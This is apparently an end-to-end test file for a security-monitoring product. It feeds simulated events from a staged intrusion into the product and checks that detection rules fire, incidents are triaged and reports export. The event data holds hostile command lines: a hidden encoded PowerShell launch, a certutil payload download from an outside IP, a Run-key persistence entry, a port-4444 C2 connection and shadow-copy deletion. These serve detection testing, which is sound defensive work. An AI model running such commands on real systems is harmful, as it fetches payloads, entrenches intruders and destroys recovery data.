"""Tier 4: Real-World Workload Scenarios (Simulated Multi-Stage Intrusion Exercise).

Executes Operation "Ignis Vector" — a multi-stage adversary attack campaign:
1. Stage 1: Initial Execution via LOLBin (Encoded PowerShell Command)
2. Stage 2: Secondary Payload Retrieval via Certutil LOLBin
3. Stage 3: Network Defense Evasion via System Hosts File Tampering (FIM)
4. Stage 4: Local Persistence Establishment via Registry Run Key
5. Stage 5: Outbound Command-and-Control (C2) on Reverse Shell Port 4444
6. Stage 6: Ransomware Impact Preparation via Volume Shadow Copy Deletion
7. Stage 7: SOC Analyst Triage, Priority Review, and Lifecycle Transitions
8. Stage 8: Forensic Multi-Format Investigation Report Export & Validation
"""

from __future__ import annotations

import json

from tests.e2e.harness.base import AgniE2ETestCase
from tests.e2e.harness.fixtures import (
    make_fim_event,
    make_network_event,
    make_persistence_event,
    make_process_event,
)


class TestTier4RealWorldScenarios(AgniE2ETestCase):
    """End-to-end simulation of a real-world multi-stage intrusion and SOC response."""

    def test_operation_ignis_vector_multi_stage_intrusion_lifecycle(self) -> None:
        """Simulate complete 6-stage APT intrusion lifecycle followed by SOC investigation and report export."""
        victim_pid = 5432

        # =========================================================================
        # STAGE 1: Initial Access & Obfuscated Execution
        # =========================================================================
        stage1_ev = make_process_event(
            name="powershell.exe",
            cmdline="powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            pid=victim_pid,
            ppid=1024,
        )
        s1_resp = self.client.ingest_event(stage1_ev)
        self.assertTrue(s1_resp.is_success, f"Stage 1 ingest failed: {s1_resp.text}")

        # =========================================================================
        # STAGE 2: Secondary Payload Staging via Certutil LOLBin
        # =========================================================================
        stage2_ev = make_process_event(
            name="certutil.exe",
            cmdline="certutil.exe -urlcache -split -f http://198.51.100.22/stage2.bin C:\\Temp\\stage2.exe",
            pid=victim_pid + 1,
            ppid=victim_pid,
        )
        s2_resp = self.client.ingest_event(stage2_ev)
        self.assertTrue(s2_resp.is_success, f"Stage 2 ingest failed: {s2_resp.text}")

        # =========================================================================
        # STAGE 3: DNS Hijacking & Defense Evasion via System Hosts Modification (FIM)
        # =========================================================================
        stage3_ev = make_fim_event(
            file_path=r"C:\Windows\System32\drivers\etc\hosts",
            action="modified",
            previous_sha256="1111111111111111111111111111111111111111111111111111111111111111",
            current_sha256="2222222222222222222222222222222222222222222222222222222222222222",
        )
        s3_resp = self.client.ingest_event(stage3_ev)
        self.assertTrue(s3_resp.is_success, f"Stage 3 ingest failed: {s3_resp.text}")

        # =========================================================================
        # STAGE 4: Persistence Installation via Registry Run Key
        # =========================================================================
        stage4_ev = make_persistence_event(
            target_identifier=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck",
            action="created",
            command=r"C:\Temp\stage2.exe",
        )
        s4_resp = self.client.ingest_event(stage4_ev)
        self.assertTrue(s4_resp.is_success, f"Stage 4 ingest failed: {s4_resp.text}")

        # =========================================================================
        # STAGE 5: Outbound Command-and-Control (C2) Established on Reverse Shell Port 4444
        # =========================================================================
        stage5_ev = make_network_event(
            remote_ip="198.51.100.88",
            remote_port=4444,
            pid=victim_pid,
            process_name="stage2.exe",
        )
        s5_resp = self.client.ingest_event(stage5_ev)
        self.assertTrue(s5_resp.is_success, f"Stage 5 ingest failed: {s5_resp.text}")

        # Ingest repeat beaconing to verify alert deduplication
        stage5_repeat_ev = make_network_event(
            remote_ip="198.51.100.88",
            remote_port=4444,
            pid=victim_pid,
            process_name="stage2.exe",
        )
        self.client.ingest_event(stage5_repeat_ev)

        # =========================================================================
        # STAGE 6: Ransomware Impact Preparation (Shadow Copy Deletion)
        # =========================================================================
        stage6_ev = make_process_event(
            name="vssadmin.exe",
            cmdline="vssadmin.exe delete shadows /all /quiet",
            pid=victim_pid + 10,
            ppid=victim_pid,
        )
        s6_resp = self.client.ingest_event(stage6_ev)
        self.assertTrue(s6_resp.is_success, f"Stage 6 ingest failed: {s6_resp.text}")

        # =========================================================================
        # STAGE 7: SOC Analyst Triage & Investigation
        # =========================================================================
        incidents_resp = self.client.get_incidents()
        self.assertTrue(incidents_resp.is_success, f"Failed to retrieve incidents: {incidents_resp.text}")
        incidents = incidents_resp.data

        # Verify all 6 stages generated corresponding incidents
        rule_ids = {i["rule_id"] for i in incidents}
        self.assertIn("AGNI-R-PROC-001", rule_ids, "Missing Stage 1 incident (PowerShell Encoded)")
        self.assertIn("AGNI-R-PROC-002", rule_ids, "Missing Stage 2 incident (Certutil Download)")
        self.assertIn("AGNI-R-FIM-001", rule_ids, "Missing Stage 3 incident (Hosts File FIM)")
        self.assertIn("AGNI-R-PERS-001", rule_ids, "Missing Stage 4 incident (Run Key Persistence)")
        self.assertIn("AGNI-R-NET-001", rule_ids, "Missing Stage 5 incident (C2 Port 4444)")
        self.assertIn("AGNI-R-PROC-003", rule_ids, "Missing Stage 6 incident (Vssadmin Deletion)")

        # Verify Stage 5 Deduplication (event_count >= 2 on C2 incident)
        c2_inc = next(i for i in incidents if i["rule_id"] == "AGNI-R-NET-001")
        self.assertGreaterEqual(c2_inc["event_count"], 2, "C2 incident should deduplicate repeated beacons")

        # Triage Critical Ransomware incident (Stage 6)
        ransomware_inc = next(i for i in incidents if i["rule_id"] == "AGNI-R-PROC-003")
        self.assertEqual(ransomware_inc["severity"], "Critical")
        self.assertEqual(ransomware_inc["priority"], "P1_Critical")

        # Analyst reviews and updates status to 'In Progress'
        r_id = ransomware_inc["id"]
        upd_resp = self.client.update_incident_status(
            r_id,
            status="In Progress",
            note="P1 Ransomware threat confirmed: Vssadmin shadow copy deletion observed.",
        )
        self.assertTrue(upd_resp.is_success)

        # Analyst adds detailed forensic notes
        note_resp = self.client.add_incident_note(
            r_id,
            content="Evidence indicates multi-stage dropper originating from PID 5432. Active C2 on port 4444 identified.",
        )
        self.assertTrue(note_resp.is_success)

        # =========================================================================
        # STAGE 8: Multi-Format Forensic Report Generation
        # =========================================================================
        # 1. JSON Report
        json_report = self.client.export_report(export_format="json", date_range="24h")
        self.assertTrue(json_report.is_success)
        parsed = json.loads(json_report.text)
        self.assertIn("incidents", parsed)
        self.assertGreaterEqual(len(parsed["incidents"]), 6)

        # 2. CSV Report
        csv_report = self.client.export_report(export_format="csv", date_range="24h")
        self.assertTrue(csv_report.is_success)
        lines = csv_report.text.strip().splitlines()
        self.assertGreaterEqual(len(lines), 7)  # Header + 6 incidents

        # 3. Standalone HTML Report
        html_report = self.client.export_report(export_format="html", date_range="24h")
        self.assertTrue(html_report.is_success)
        self.assertIn("Agni (अग्नि)", html_report.text)
        self.assertIn("Critical", html_report.text)
        self.assertIn("AGNI-R-PROC-003", html_report.text)
